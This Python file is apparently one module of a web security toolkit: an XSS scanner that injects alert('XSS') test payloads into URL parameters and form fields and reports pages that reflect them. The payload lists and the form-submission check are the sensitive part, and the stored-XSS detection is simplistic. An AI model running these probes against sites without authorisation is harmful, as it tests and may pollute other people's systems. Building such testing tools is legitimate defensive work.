#!/usr/bin/env python3
# app/vulnerability/xss_scanner.py - XSS Vulnerability Scanner

import requests
import sys
import os
from urllib.parse import urlparse, parse_qs, urljoin
from datetime import datetime
import re

BASE_DIR = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
sys.path.insert(0, BASE_DIR)

from config import C_OK, C_WARN, C_ERR, C_RESET, C_INFO, C_TITLE, REQUEST_TIMEOUT, HEADERS
from utils import Logger, pause, clear_screen, InputValidator, ReportWriter

class XSSScanner:
    def __init__(self):
        self.target = None
        self.vulnerabilities = []
        self.session = requests.Session()
        self.session.headers.update(HEADERS)
        
        # XSS Payloads
        self.reflected_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "'\"><script>alert(String.fromCharCode(88,83,83))</script>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<marquee onstart=alert('XSS')>",
        ]
        
        self.dom_payloads = [
            "#<script>alert('XSS')</script>",
            "#<img src=x onerror=alert('XSS')>",
        ]
        
        # XSS detection patterns
        self.xss_patterns = [
            r'<script[^>]*>.*?</script>',
            r'<img[^>]+onerror',
            r'<svg[^>]+onload',
            r'<iframe[^>]+src',
            r'<body[^>]+onload',
            r'javascript:',
            r'on\w+\s*=',
        ]
    
    def run(self):
        """Main XSS scanner"""
        clear_screen()
        print(f"\n{C_TITLE}╔══════════════════════════════════════════╗")
        print(f"║         XSS VULNERABILITY SCANNER        ║")
        print(f"╚══════════════════════════════════════════╝{C_RESET}\n")
        
        self.target = InputValidator.get_url()
        if not self.target:
            return
        
        Logger.info(f"Target: {self.target}")
        Logger.warning("Starting XSS vulnerability scan...")
        print()
        
        # Run scans
        self.test_reflected_xss()
        self.test_dom_xss()
        self.test_stored_xss()
        
        # Results
        self.display_results()
        self.save_report()
        
        pause()
    
    def test_reflected_xss(self):
        """Test for Reflected XSS"""
        Logger.info("Testing for Reflected XSS...")
        
        try:
            parsed = urlparse(self.target)
            params = parse_qs(parsed.query)
            
            if not params:
                Logger.info("No URL parameters found, testing with common parameters...")
                # Try common parameter names
                common_params = ['q', 'search', 'query', 'name', 'keyword', 's', 'id', 'page']
                
                for param in common_params:
                    for payload in self.reflected_payloads[:5]:
                        test_url = f"{self.target}{'&' if '?' in self.target else '?'}{param}={payload}"
                        
                        try:
                            response = self.session.get(test_url, timeout=REQUEST_TIMEOUT, verify=False)
                            
                            if payload in response.text:
                                if any(re.search(pattern, response.text, re.IGNORECASE) 
                                       for pattern in self.xss_patterns):
                                    vuln = {
                                        'type': 'Reflected XSS',
                                        'severity': 'High',
                                        'parameter': param,
                                        'payload': payload,
                                        'url': test_url,
                                        'method': 'GET',
                                        'description': f'Reflected XSS found with parameter: {param}'
                                    }
                                    self.vulnerabilities.append(vuln)
                                    Logger.warning(f"Reflected XSS found! Parameter: {param}")
                                    break
                        except:
                            continue
                    
                    if self.vulnerabilities:
                        break
                
                Logger.success("Reflected XSS test complete")
                return
            
            for param in params.keys():
                Logger.info(f"Testing parameter: {param}")
                
                for payload in self.reflected_payloads:
                    test_url = self.target.replace(
                        f"{param}={params[param][0]}", 
                        f"{param}={payload}"
                    )
                    
                    try:
                        response = self.session.get(test_url, timeout=REQUEST_TIMEOUT, verify=False)
                        
                        # Check if payload is reflected in response
                        if payload in response.text:
                            # Double check with pattern matching
                            if any(re.search(pattern, response.text, re.IGNORECASE) 
                                   for pattern in self.xss_patterns):
                                vuln = {
                                    'type': 'Reflected XSS',
                                    'severity': 'High',
                                    'parameter': param,
                                    'payload': payload,
                                    'url': test_url,
                                    'method': 'GET',
                                    'description': f'Reflected XSS found in parameter: {param}'
                                }
                                self.vulnerabilities.append(vuln)
                                Logger.warning(f"Reflected XSS found! Parameter: {param}")
                                break
                    except Exception as e:
                        continue
            
            Logger.success("Reflected XSS test complete")
        except Exception as e:
            Logger.error(f"Reflected XSS test failed: {e}")
    
    def test_dom_xss(self):
        """Test for DOM-based XSS"""
        Logger.info("Testing for DOM-based XSS...")
        
        try:
            for payload in self.dom_payloads:
                test_url = self.target + payload
                
                try:
                    response = self.session.get(test_url, timeout=REQUEST_TIMEOUT, verify=False)
                    
                    # Check for DOM XSS indicators
                    dom_indicators = [
                        'document.location',
                        'document.URL',
                        'document.referrer',
                        'window.location',
                        'location.hash',
                        'innerHTML',
                        'document.write',
                    ]
                    
                    if any(indicator in response.text for indicator in dom_indicators):
                        if payload.replace('#', '') in response.text:
                            vuln = {
                                'type': 'DOM-based XSS',
                                'severity': 'High',
                                'payload': payload,
                                'url': test_url,
                                'description': 'Possible DOM-based XSS vulnerability'
                            }
                            self.vulnerabilities.append(vuln)
                            Logger.warning(f"DOM-based XSS found! Payload: {payload}")
                            break
                except:
                    continue
            
            Logger.success("DOM-based XSS test complete")
        except Exception as e:
            Logger.error(f"DOM XSS test failed: {e}")
    
    def test_stored_xss(self):
        """Test for Stored XSS (basic check)"""
        Logger.info("Testing for Stored XSS...")
        
        try:
            # Look for forms
            response = self.session.get(self.target, timeout=REQUEST_TIMEOUT, verify=False)
            
            # Simple form detection
            if '<form' in response.text.lower():
                Logger.info("Forms detected on page")
                
                # Extract forms
                forms = re.findall(r'<form[^>]*>.*?</form>', response.text, re.DOTALL | re.IGNORECASE)
                
                if forms:
                    Logger.info(f"Found {len(forms)} form(s)")
                    
                    # Test each form with payloads
                    for i, form in enumerate(forms, 1):
                        # Extract inputs
                        inputs = re.findall(r'<input[^>]+name=["\']([^"\']+)["\']', form, re.IGNORECASE)
                        
                        if inputs:
                            Logger.info(f"Form {i} has {len(inputs)} input field(s)")
                            
                            for payload in self.reflected_payloads[:3]:  # Test first 3 payloads
                                form_data = {inp: payload for inp in inputs}
                                
                                try:
                                    post_response = self.session.post(
                                        self.target, 
                                        data=form_data, 
                                        timeout=REQUEST_TIMEOUT, 
                                        verify=False
                                    )
                                    
                                    if payload in post_response.text:
                                        vuln = {
                                            'type': 'Stored XSS',
                                            'severity': 'Critical',
                                            'payload': payload,
                                            'form_number': i,
                                            'method': 'POST',
                                            'description': 'Possible Stored XSS vulnerability in form'
                                        }
                                        self.vulnerabilities.append(vuln)
                                        Logger.warning(f"Possible Stored XSS in form {i}")
                                        break
                                except:
                                    continue
                else:
                    Logger.info("No forms found")
            else:
                Logger.info("No forms detected")
            
            Logger.success("Stored XSS test complete")
        except Exception as e:
            Logger.error(f"Stored XSS test failed: {e}")
    
    def display_results(self):
        """Display scan results"""
        print(f"\n{C_TITLE}{'='*60}")
        print(f"XSS SCAN RESULTS")
        print(f"{'='*60}{C_RESET}\n")
        
        if not self.vulnerabilities:
            Logger.success("No XSS vulnerabilities found!")
            return
        
        # Count by type
        reflected = len([v for v in self.vulnerabilities if v['type'] == 'Reflected XSS'])
        dom = len([v for v in self.vulnerabilities if v['type'] == 'DOM-based XSS'])
        stored = len([v for v in self.vulnerabilities if v['type'] == 'Stored XSS'])
        
        print(f"{C_WARN}Reflected XSS: {reflected}{C_RESET}")
        print(f"{C_WARN}DOM-based XSS: {dom}{C_RESET}")
        print(f"{C_ERR}Stored XSS: {stored}{C_RESET}")
        print()
        
        # Display details
        for i, vuln in enumerate(self.vulnerabilities, 1):
            severity_color = C_ERR if vuln['severity'] == 'Critical' else C_WARN
            
            print(f"{severity_color}[{i}] {vuln['type']}{C_RESET}")
            print(f"  Severity: {vuln['severity']}")
            if 'parameter' in vuln:
                print(f"  Parameter: {vuln['parameter']}")
            print(f"  Payload: {vuln['payload']}")
            print(f"  Description: {vuln['description']}")
            print()
    
    def save_report(self):
        """Save scan report"""
        if not self.vulnerabilities:
            return
        
        timestamp = ReportWriter.get_timestamp()
        filename = f"xss_scan_{timestamp}"
        
        report_data = {
            'target': self.target,
            'scan_date': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'total_vulnerabilities': len(self.vulnerabilities),
            'vulnerabilities': self.vulnerabilities
        }
        
        # Save JSON
        ReportWriter.save_json(filename, report_data, subfolder='vulnerability/xss_scanner')
        
        # Save TXT
        txt_content = ReportWriter.create_report_header("XSS SCAN REPORT", self.target)
        txt_content += f"Total Vulnerabilities: {len(self.vulnerabilities)}\n\n"
        
        reflected = len([v for v in self.vulnerabilities if v['type'] == 'Reflected XSS'])
        dom = len([v for v in self.vulnerabilities if v['type'] == 'DOM-based XSS'])
        stored = len([v for v in self.vulnerabilities if v['type'] == 'Stored XSS'])
        
        txt_content += f"Reflected XSS: {reflected}\n"
        txt_content += f"DOM-based XSS: {dom}\n"
        txt_content += f"Stored XSS: {stored}\n\n"
        
        for i, vuln in enumerate(self.vulnerabilities, 1):
            txt_content += f"[{i}] {vuln['type']} - {vuln['severity']}\n"
            if 'parameter' in vuln:
                txt_content += f"Parameter: {vuln['parameter']}\n"
            txt_content += f"Payload: {vuln['payload']}\n"
            txt_content += f"Description: {vuln['description']}\n"
            txt_content += "\n"
        
        ReportWriter.save_txt(filename, txt_content, subfolder='vulnerability/xss_scanner')

if __name__ == "__main__":
    scanner = XSSScanner()
    scanner.run()